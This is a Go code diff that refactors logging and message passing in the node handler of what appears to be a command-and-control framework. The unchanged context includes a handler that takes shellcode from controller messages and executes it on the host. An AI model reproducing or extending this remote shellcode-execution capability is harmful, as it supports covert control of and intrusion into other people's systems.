@@ -1,9 +1,11 @@
 package node
 
 import (
+	"bytes"
 	"context"
 	"fmt"
 
+	"github.com/davecgh/go-spew/spew"
 	"github.com/vmihailenco/msgpack/v4"
 
 	"project/internal/convert"
@@ -29,14 +31,6 @@ func newHandler(ctx *Node) *handler {
 	return &h
 }
 
-func (h *handler) logf(l logger.Level, format string, log ...interface{}) {
-	h.ctx.logger.Printf(l, "handler", format, log...)
-}
-
-func (h *handler) log(l logger.Level, log ...interface{}) {
-	h.ctx.logger.Println(l, "handler", log...)
-}
-
 func (h *handler) Cancel() {
 	h.cancel()
 }
@@ -45,31 +39,69 @@ func (h *handler) Close() {
 	h.ctx = nil
 }
 
+func (h *handler) logf(l logger.Level, format string, log ...interface{}) {
+	h.ctx.logger.Printf(l, "handler", format, log...)
+}
+
+func (h *handler) log(l logger.Level, log ...interface{}) {
+	h.ctx.logger.Println(l, "handler", log...)
+}
+
+// logfWithInfo will print log with role GUID and message
+// [2020-01-30 15:13:07] [info] <handler> foo logf
+// spew output
+//
+// first log interface must be *protocol.Send or protocol.Broadcast
+func (h *handler) logfWithInfo(l logger.Level, format string, log ...interface{}) {
+	buf := new(bytes.Buffer)
+	_, _ = fmt.Fprintf(buf, format, log[1:]...)
+	buf.WriteString("\n")
+	spew.Fdump(buf, log[0])
+	h.ctx.logger.Print(l, "handler", buf)
+}
+
+// logWithInfo will print log with role GUID and message
+// [2020-01-30 15:13:07] [info] <handler> foo log
+// spew output
+//
+// first log interface must be *protocol.Send or protocol.Broadcast
+func (h *handler) logWithInfo(l logger.Level, log ...interface{}) {
+	buf := new(bytes.Buffer)
+	_, _ = fmt.Fprintln(buf, log[1:]...)
+	buf.WriteString("\n")
+	spew.Fdump(buf, log[0])
+	h.ctx.logger.Print(l, "handler", buf)
+}
+
 // -------------------------------------------send---------------------------------------------------
 
-func (h *handler) OnSend(s *protocol.Send) {
+func (h *handler) OnSend(send *protocol.Send) {
 	defer func() {
 		if r := recover(); r != nil {
 			err := xpanic.Error(r, "handler.OnSend")
 			h.log(logger.Fatal, err)
 		}
 	}()
-	if len(s.Message) < 4 {
-		h.logf(logger.Exploit, "controller send with invalid size")
+	if len(send.Message) < 4 {
+		const log = "controller send with invalid size"
+		h.logWithInfo(logger.Exploit, send, log)
 		return
 	}
-	switch convert.BytesToUint32(s.Message[:4]) {
+	msgType := convert.BytesToUint32(send.Message[:4])
+	send.Message = send.Message[4:]
+	switch msgType {
 	case messages.CMDExecuteShellCode:
-		h.handleExecuteShellCode(s.Message[4:])
+		h.handleExecuteShellCode(send)
 	case messages.CMDTest:
-		h.handleSendTestMessage(s.Message[4:])
+		h.handleSendTestMessage(send)
 	default:
-		h.logf(logger.Exploit, "controller send unknown message: %X", s.Message)
+		const format = "controller send unknown message\ntype: 0x%08X\n%s"
+		h.logf(logger.Exploit, format, msgType, spew.Sdump(send))
 	}
 }
 
 // TODO <security> must remove to Beacon
-func (h *handler) handleExecuteShellCode(message []byte) {
+func (h *handler) handleExecuteShellCode(send *protocol.Send) {
 	defer func() {
 		if r := recover(); r != nil {
 			err := xpanic.Error(r, "handler.handleExecuteShellCode")
@@ -77,10 +109,10 @@ func (h *handler) handleExecuteShellCode(message []byte) {
 		}
 	}()
 	var es messages.ExecuteShellCode
-	err := msgpack.Unmarshal(message, &es)
+	err := msgpack.Unmarshal(send.Message, &es)
 	if err != nil {
-		const format = "controller send invalid shellcode: %X"
-		h.logf(logger.Exploit, format, message)
+		const log = "controller send invalid shellcode"
+		h.logWithInfo(logger.Exploit, send, log)
 		return
 	}
 	err = shellcode.Execute(es.Method, es.ShellCode)
@@ -89,7 +121,7 @@ func (h *handler) handleExecuteShellCode(message []byte) {
 	}
 }
 
-func (h *handler) handleSendTestMessage(message []byte) {
+func (h *handler) handleSendTestMessage(send *protocol.Send) {
 	defer func() {
 		if r := recover(); r != nil {
 			err := xpanic.Error(r, "handler.handleSendTestMessage")
@@ -99,45 +131,42 @@ func (h *handler) handleSendTestMessage(message []byte) {
 	if h.ctx.Test.SendTestMsg == nil {
 		return
 	}
-	var testMsg []byte
-	err := msgpack.Unmarshal(message, &testMsg)
-	if err != nil {
-		const format = "controller send invalid test message: %X"
-		h.logf(logger.Exploit, format, message)
-		return
-	}
 	select {
-	case h.ctx.Test.SendTestMsg <- testMsg:
+	case h.ctx.Test.SendTestMsg <- send.Message:
 	case <-h.context.Done():
 	}
 }
 
 // ----------------------------------------broadcast-------------------------------------------------
 
-func (h *handler) OnBroadcast(s *protocol.Broadcast) {
+func (h *handler) OnBroadcast(broadcast *protocol.Broadcast) {
 	defer func() {
 		if r := recover(); r != nil {
 			err := xpanic.Error(r, "handler.OnBroadcast")
 			h.log(logger.Fatal, err)
 		}
 	}()
-	if len(s.Message) < 4 {
-		h.logf(logger.Exploit, "controller broadcast with invalid size")
+	if len(broadcast.Message) < 4 {
+		const log = "controller broadcast with invalid size"
+		h.logWithInfo(logger.Exploit, broadcast, log)
 		return
 	}
-	switch convert.BytesToUint32(s.Message[:4]) {
+	msgType := convert.BytesToUint32(broadcast.Message[:4])
+	broadcast.Message = broadcast.Message[4:]
+	switch msgType {
 	case messages.CMDNodeRegisterResponse:
-		h.handleNodeRegisterResponse(s.Message[4:])
+		h.handleNodeRegisterResponse(broadcast)
 	case messages.CMDBeaconRegisterResponse:
-		h.handleBeaconRegisterResponse(s.Message[4:])
+		h.handleBeaconRegisterResponse(broadcast)
 	case messages.CMDTest:
-		h.handleBroadcastTestMessage(s.Message[4:])
+		h.handleBroadcastTestMessage(broadcast)
 	default:
-		h.logf(logger.Exploit, "controller broadcast unknown message: %X", s.Message)
+		const format = "controller broadcast unknown message\ntype: 0x%08X\n%s"
+		h.logf(logger.Exploit, format, msgType, spew.Sdump(broadcast))
 	}
 }
 
-func (h *handler) handleNodeRegisterResponse(message []byte) {
+func (h *handler) handleNodeRegisterResponse(broadcast *protocol.Broadcast) {
 	defer func() {
 		if r := recover(); r != nil {
 			err := xpanic.Error(r, "handler.handleNodeRegisterResponse")
@@ -145,10 +174,10 @@ func (h *handler) handleNodeRegisterResponse(message []byte) {
 		}
 	}()
 	nrr := new(messages.NodeRegisterResponse)
-	err := msgpack.Unmarshal(message, nrr)
+	err := msgpack.Unmarshal(broadcast.Message, nrr)
 	if err != nil {
-		const format = "controller broadcast invalid node register response: %X"
-		h.logf(logger.Exploit, format, message)
+		const log = "controller broadcast invalid node register response"
+		h.logWithInfo(logger.Exploit, broadcast, log)
 		return
 	}
 	h.ctx.storage.AddNodeSessionKey(nrr.GUID, &nodeSessionKey{
@@ -159,7 +188,7 @@ func (h *handler) handleNodeRegisterResponse(message []byte) {
 	h.ctx.storage.SetNodeRegister(nrr.GUID, nrr)
 }
 
-func (h *handler) handleBeaconRegisterResponse(message []byte) {
+func (h *handler) handleBeaconRegisterResponse(broadcast *protocol.Broadcast) {
 	defer func() {
 		if r := recover(); r != nil {
 			err := xpanic.Error(r, "handler.handleBeaconRegisterResponse")
@@ -167,10 +196,10 @@ func (h *handler) handleBeaconRegisterResponse(message []byte) {
 		}
 	}()
 	brr := new(messages.BeaconRegisterResponse)
-	err := msgpack.Unmarshal(message, brr)
+	err := msgpack.Unmarshal(broadcast.Message, brr)
 	if err != nil {
-		const format = "controller broadcast invalid beacon register response: %X"
-		h.logf(logger.Exploit, format, message)
+		const log = "controller broadcast invalid beacon register response"
+		h.logWithInfo(logger.Exploit, broadcast, log)
 		return
 	}
 	h.ctx.storage.AddBeaconSessionKey(brr.GUID, &beaconSessionKey{
@@ -181,7 +210,7 @@ func (h *handler) handleBeaconRegisterResponse(message []byte) {
 	h.ctx.storage.SetBeaconRegister(brr.GUID, brr)
 }
 
-func (h *handler) handleBroadcastTestMessage(message []byte) {
+func (h *handler) handleBroadcastTestMessage(broadcast *protocol.Broadcast) {
 	defer func() {
 		if r := recover(); r != nil {
 			err := xpanic.Error(r, "handler.handleBroadcastTestMessage")
@@ -191,15 +220,8 @@ func (h *handler) handleBroadcastTestMessage(message []byte) {
 	if h.ctx.Test.BroadcastTestMsg == nil {
 		return
 	}
-	var testMsg []byte
-	err := msgpack.Unmarshal(message, &testMsg)
-	if err != nil {
-		const format = "controller broadcast invalid test message: %X"
-		h.logf(logger.Exploit, format, message)
-		return
-	}
 	select {
-	case h.ctx.Test.BroadcastTestMsg <- testMsg:
+	case h.ctx.Test.BroadcastTestMsg <- broadcast.Message:
 	case <-h.context.Done():
 		return
 	}
